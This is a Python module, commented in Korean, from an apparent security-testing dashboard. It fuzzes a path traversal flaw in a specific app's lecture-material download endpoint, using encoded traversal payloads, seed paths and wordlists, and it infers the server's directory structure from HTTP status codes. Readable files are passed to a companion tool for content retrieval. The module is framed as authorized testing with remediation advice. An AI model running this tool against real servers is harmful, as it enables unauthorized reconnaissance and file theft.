"""자료 경로 조작 퍼징 — 응답 코드로 서버 디렉터리 구조를 그린다.

`sesacedu_material_traversal` 은 **읽을 경로를 아는** 상태에서 그 파일을 가져온다.
이 모듈은 반대다 — **경로를 모르는** 상태에서 씨앗과 사전으로 찾아낸다.

## 응답 코드를 오라클로 쓴다

이 취약점은 디렉터리 목록을 주지 않는다. 그래서 코드 자체로 구조를 역산한다.

    200  파일이고 읽혔다
    500  있는데 파일로 못 보냄 — 디렉터리이거나 읽기 권한이 없다
    404  **stat 실패** — 없거나, 상위 경로에 탐색 권한이 없다

근거는 `LectureFileStorage.resolve()` 다. `exists()` 가 거짓이면 404 를 던지고,
참이면 `FileSystemResource` 전송에서 디렉터리·권한 문제로 예외가 나 500 이 된다.

## 단정하지 않는 두 가지 (2026-11-04 실측)

**404 는 '없음'이 아니다.** 리눅스에서 `/a/b` 를 stat 하려면 `/a` 에 실행(탐색)
권한이 필요하고, 없으면 EACCES 로 실패해 404 가 된다. 실서버에서 `/root` 는 500 인데
`/root/.bashrc` 는 404 였다 — 그 파일은 분명히 존재한다. 그래서 404 를 '없다'고
적지 않는다.

**500 은 두 가지를 겸하고 가릴 수 없다.** `<경로>/..` 를 한 번 더 때리면 디렉터리는
상위로 해석돼 500 이 오고 일반 파일은 ENOTDIR 로 404 가 온다. 그런데 **탐색 권한이
없는 디렉터리도 EACCES 로 404** 를 준다. `/etc/shadow/..` 와 `/root/..` 가 같은 404 다.
그래서 가리지 못한 500 은 '못 들어감'으로만 적고 '파일'이라고 쓰지 않는다.

## 왜 무차별이 아니라 씨앗부터인가

최상위에 사전 4,600개를 때리면 거의 전부 404 다. 반대로 'nginx 를 데비안 패키지로
깔면 /etc/nginx/sites-available 이 생긴다'는 **확정 사실**이다. 실측에서 찾은 94개 중
씨앗이 55개, 사전이 33개였다 — 씨앗이 사전보다 적중률이 높다.

사전 모드는 그 씨앗으로 **확정된 디렉터리 아래**에서만 쓴다. 범용 웹 사전보다
`fs-dirnames.txt` 가 잘 맞는다 — `webapps` 아래를 뚫은 이름은 `ROOT`·`ROOT.war` 였고,
범용 사전에는 없는 이름이다.

## 한계 — 이름을 맞혀야만 찾는다

버전 문자열이 든 이름(`jdk-11.0.24+8`)이나 난수 접두사가 붙은 저장 파일명은
어떤 사전에도 없다. 실측에서 그런 경로는 **설정 파일 내용이 알려 줬다**
(systemd 유닛의 `JAVA_HOME`·`EnvironmentFile`). 읽힌 파일에서 절대경로를 눈으로
찾아 다시 넣는 것이 지금은 사람 몫이다. `note` 에 그 안내를 넣어 둔다.

칼리에서 더 깊이 돌리려면 `08_모의해킹/file_inclution/fsmap/` 의 도구를 쓰고,
결과는 '칼리 fsmap 결과 가져오기' 모듈로 가져온다.
"""
from dashboard.core import Finding, ToolResult, fetch
from dashboard.payloads import ENCODINGS, traversal
from dashboard import wordlists
from projects.sesacedu.modules.material_fs_map import _size, _tree

META = {
    "id": "sesacedu_material_traversal_fuzz",
    "name": "자료 경로 조작 퍼징 (구조 그리기)",
    "category": "경로 조작",
    # 로그인한 사용자가 저장소 밖 파일·디렉터리 구조를 알아낸다
    "cvss": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
    "kind": "active",
    "roles": ["user_web", "practice"],
    "stage": "tool",
    "severity": "high",
    "attack": [
        {"tactic": "TA0007", "technique": "T1083", "name": "File and Directory Discovery"},
        {"tactic": "TA0043", "technique": "T1595.003", "name": "Active Scanning: Wordlist Scanning"},
    ],
    "description": "씨앗(패키지 기본 경로)이나 사전으로 경로를 때려 응답 코드로 "
                   "디렉터리 구조를 그립니다. 파일 내용은 가져오지 않습니다.",
    "needs": [
        {"kind": "auth_header", "name": "Authorization",
         "why": "강의 자료는 로그인한 사용자만 내려받을 수 있어, 토큰이 없으면 전부 401 로 "
                "돌아옵니다 — 그러면 '아무것도 없다'는 거짓 지도가 나옵니다",
         "how": "대상 탭에서 그 대상의 '인증 헤더' 에 Authorization: Bearer <토큰> 을 "
                "한 줄 넣습니다. 테스트 계정 토큰만 쓰세요"},
        {"kind": "env", "name": "DASH_WORDLISTS", "required": False,
         "why": "저장소 씨앗 사전만으로는 이름 후보가 좁습니다. SecLists 를 붙이면 "
                "raft-small-directories 처럼 디렉터리 이름만 모은 목록을 고를 수 있습니다",
         "how": "SecLists 를 받아 대시보드를 띄우기 전에 DASH_WORDLISTS 에 그 폴더를 "
                "넣습니다 (wordlists/README.md). 칼리에는 /usr/share/seclists 에 이미 있습니다"},
    ],
    "params": [
        {"name": "mode", "label": "무엇으로 찾을지", "type": "select", "default": "seed",
         "options": [
             {"value": "seed", "label": "씨앗 — 패키지를 깔면 생기는 경로 (적중률 높음)"},
             {"value": "expand", "label": "사전 — 확정된 디렉터리 아래를 넓게"},
         ],
         "help": "씨앗으로 먼저 디렉터리를 확정하고, 그 아래를 사전으로 넓히는 순서가 요청을 아낍니다."},
        {"name": "wordlist", "label": "사전", "type": "wordlist", "purpose": "path",
         "default": "fs-seeds-sesacedu.txt",
         "help": "씨앗 모드는 fs-seeds-sesacedu.txt(전체 경로), 사전 모드는 "
                 "fs-dirnames.txt(이름)를 씁니다. SecLists 를 붙이면 함께 뜹니다."},
        {"name": "base", "label": "기준 디렉터리 (사전 모드)", "default": "srv/sesacedu",
         "help": "사전 모드에서 이 아래를 때립니다. 맨 앞 / 는 빼고 씁니다. "
                 "씨앗 모드에서는 무시합니다."},
        {"name": "limit", "label": "몇 개까지", "type": "int", "default": "120",
         "help": "사전 앞에서부터 이만큼만 봅니다. 하나에 요청 한 번입니다."},
        {"name": "kinds", "label": "500 의 종류를 가릴지", "type": "select", "default": "yes",
         "options": [
             {"value": "yes", "label": "가린다 — '<경로>/..' 를 더 때린다 (요청 늘어남)"},
             {"value": "no", "label": "안 가린다 — 요청 절약"},
         ],
         "help": "가려도 '못 읽는 파일'과 '탐색 권한 없는 디렉터리'는 구분되지 않습니다."},
        {"name": "depth", "label": "올라갈 단계", "type": "int", "default": "9",
         "help": "저장 폴더에서 위로 몇 번. 실측 최소값은 6 이고 넉넉히 줘도 최상위에서 멈춥니다."},
        {"name": "scheme", "label": "인코딩", "type": "select", "default": "double-full",
         "options": [{"value": k, "label": v} for k, v in ENCODINGS.items()]},
        {"name": "lecture", "label": "강의 번호", "default": "123"},
    ],
}

PATH = "/backend/lectures/{lecture}/material/download?file={payload}"
MAX_REQUESTS = 400          # 한 번에 보낼 수 있는 상한
DIR = "dir"
OPAQUE = "opaque"

# 응답 코드 → 뜻. 404 를 '없음'이라고 쓰지 않는 것이 요점이다.
READABLE, EXISTS, UNSTAT, DENIED, AUTH = "readable", "exists", "unstat", "denied", "auth"
BY_STATUS = {200: READABLE, 401: AUTH, 403: DENIED, 404: UNSTAT, 500: EXISTS}
LABEL = {
    READABLE: "읽힘",
    EXISTS: "있음(파일로 못 보냄)",
    UNSTAT: "없음 또는 접근 불가",
    DENIED: "탈출 검사 차단",
    AUTH: "토큰 필요",
}


def _send(target, lecture, depth, scheme, path):
    """경로 하나를 때린다. 파일 내용은 기록하지 않는다(구조만 본다)."""
    payload = traversal(path, depth, scheme)
    url = target.url + PATH.format(lecture=lecture, payload=payload)
    r = fetch(url, record_body=False)
    klass = BY_STATUS.get(r.status, "other")
    return klass, r


def run(target, params):
    mode = params.get("mode", "seed")
    scheme = params.get("scheme", "double-full")
    lecture = params.get("lecture", "123")
    depth = int(params.get("depth") or 9)
    limit = max(1, int(params.get("limit") or 120))
    want_kinds = params.get("kinds", "yes") == "yes"
    base = (params.get("base") or "").strip().strip("/")

    words, cut = wordlists.load(params.get("wordlist", ""), limit=limit)
    if not words:
        raise ValueError("사전이 비어 있습니다. 다른 사전을 골라 주세요")

    if mode == "expand":
        if not base:
            raise ValueError("사전 모드에서는 기준 디렉터리를 적어 주세요 (예: srv/sesacedu)")
        targets, bad = [], 0
        for w in words:
            w = w.strip().strip("/")
            if not w or "/" in w or ".." in w:
                bad += 1
                continue
            targets.append(base + "/" + w)
    else:
        targets = [w.strip().strip("/") for w in words if w.strip()]
        bad = 0

    # 중복 제거 — 순서를 지킨다(좋은 사전은 빈도순이고 limit 로 자를 때 그 순서가 중요하다)
    seen, ordered = set(), []
    for t in targets:
        if t not in seen:
            seen.add(t)
            ordered.append(t)
    targets = ordered

    budget = MAX_REQUESTS // (2 if want_kinds else 1)
    over = len(targets) > budget
    if over:
        targets = targets[:budget]

    nodes, auth_stop = [], False
    for path in targets:
        klass, r = _send(target, lecture, depth, scheme, path)
        if klass == AUTH:
            auth_stop = True
            break
        if klass not in (READABLE, EXISTS):
            continue
        nodes.append({"path": "/" + path, "class": klass, "status": r.status,
                      "size": len(r.body or ""), "kind": None, "is_dir": None,
                      "note": "", "severity": "info", "_r": r})

    # 500 의 종류 가리기 — 디렉터리면 '<경로>/..' 가 상위로 해석돼 또 500 이 온다
    if want_kinds and not auth_stop:
        for n in nodes:
            if n["class"] != EXISTS:
                continue
            klass, _ = _send(target, lecture, depth, scheme, n["path"].strip("/") + "/..")
            if klass == AUTH:
                auth_stop = True
                break
            n["kind"] = DIR if klass == EXISTS else (OPAQUE if klass == UNSTAT else None)
            n["is_dir"] = True if n["kind"] == DIR else None

    readable = [n for n in nodes if n["class"] == READABLE]
    dirs = [n for n in nodes if n["kind"] == DIR]
    opaque = [n for n in nodes if n["kind"] == OPAQUE]
    sent = len(targets) + (len([n for n in nodes if n["class"] == EXISTS]) if want_kinds else 0)

    rows, drills = [], []
    for n in sorted(nodes, key=lambda x: x["path"]):
        kind = {DIR: "디렉터리", OPAQUE: "못 들어감"}.get(n["kind"], "미판별")
        if n["class"] == READABLE:
            kind = "파일"
        rows.append([n["path"], n["status"],
                     _size(n["size"]) if n["class"] == READABLE else "—",
                     kind, LABEL[n["class"]]])
        # 읽힌 파일은 '자료 다운로드 경로 조작' 도구로 넘겨 내용을 본다
        drills.append({"내용 보기": {"paths": n["path"].lstrip("/")}}
                      if n["class"] == READABLE else None)

    findings = []
    if readable or dirs:
        findings.append(Finding(
            title="경로 조작 퍼징으로 서버 구조 확인 (읽힌 파일 %d · 디렉터리 %d)"
                  % (len(readable), len(dirs)),
            severity="high",
            location=target.url + PATH.format(lecture=lecture, payload="<" + scheme + ">"),
            evidence=("인코딩 %s · 올라갈 단계 %s · 보낸 요청 %d건 · 때린 경로 %d개\n"
                      "읽힘 %d · 디렉터리 %d · 못 들어감 %d\n\n"
                      "읽힌 파일(앞 20개)\n%s\n\n"
                      "해석 주의: 404 였던 경로는 '없다'고 단정하지 않는다 — 상위 경로에 "
                      "탐색 권한이 없어도 404 가 온다."
                      % (scheme, depth, sent, len(targets),
                         len(readable), len(dirs), len(opaque),
                         "\n".join("  %s (%s)" % (n["path"], _size(n["size"]))
                                   for n in readable[:20]) or "  없음")),
            recommendation=("경로를 정규화(realpath)한 뒤 저장 폴더 안인지 검사하고, URL "
                            "디코딩은 먼저 한 번만 합니다. 더 나은 방법은 파일 이름을 받지 않고 "
                            "자료 번호로만 찾는 것입니다. 구조가 드러나면 다음 공격의 표적이 "
                            "좁혀지므로, 읽힌 설정 파일에 든 자격증명은 전부 교체해야 합니다."),
            response=(readable or nodes)[0]["_r"]))

    note = ["파일 내용은 가져오지 않았습니다 — 응답 코드와 길이만 봅니다. "
            "내용을 보려면 읽힌 행의 '내용 보기' 로 넘어갑니다."]
    note.append("**404 를 '없음'으로 읽지 마세요.** 404 는 stat 실패이고, 상위 경로에 탐색 "
                "권한이 없어도 옵니다 — 실서버에서 `/root` 는 500 인데 분명히 존재하는 "
                "`/root/.bashrc` 는 404 였습니다. 그래서 404 경로는 표에 올리지 않습니다.")
    note.append("**'못 들어감' 은 파일인지 디렉터리인지 가리지 못한 것입니다.** 읽기 권한이 "
                "없는 파일(ENOTDIR)과 탐색 권한이 없는 디렉터리(EACCES)가 같은 404 를 주기 "
                "때문입니다. 보고서에 '파일이다' 로 쓰면 틀립니다.")
    note.append("찾지 못한 것이 없다는 뜻은 아닙니다. 이름을 맞혀야만 찾습니다 — "
                "`jdk-11.0.24+8` 처럼 버전이 든 이름은 어떤 사전에도 없습니다. "
                "읽힌 설정 파일에서 절대경로를 찾아 다시 넣어 보세요(실측에서 systemd 유닛의 "
                "JAVA_HOME·EnvironmentFile 이 사전으로 못 찾는 경로를 알려 줬습니다).")
    if cut:
        note.append("사전이 길어 앞에서부터 %d개만 읽었습니다." % limit)
    if over:
        note.append("한 번에 %d건까지 보냅니다. 경로를 %d개로 줄여 보냈습니다 — "
                    "나머지는 기준 디렉터리를 좁혀 다시 돌리세요." % (MAX_REQUESTS, len(targets)))
    if bad:
        note.append("사전에서 경로 조각으로 쓸 수 없는 %d줄을 건너뛰었습니다(슬래시·'..' 포함)." % bad)
    if auth_stop:
        note.append("**401 을 받아 중간에 멈췄습니다.** 토큰이 없거나 만료됐습니다 — "
                    "이대로 두면 전부 404·401 로 보여 '아무것도 없다'는 거짓 지도가 됩니다.")

    return ToolResult(
        summary="때린 경로 %d · 읽힘 %d · 디렉터리 %d · 못 들어감 %d · 요청 %d건"
                % (len(targets), len(readable), len(dirs), len(opaque), sent),
        columns=["경로", "응답", "크기", "종류", "결과"],
        rows=rows, drills=drills,
        text=_tree(nodes) if nodes else "",
        findings=findings,
        note=" ".join(note))
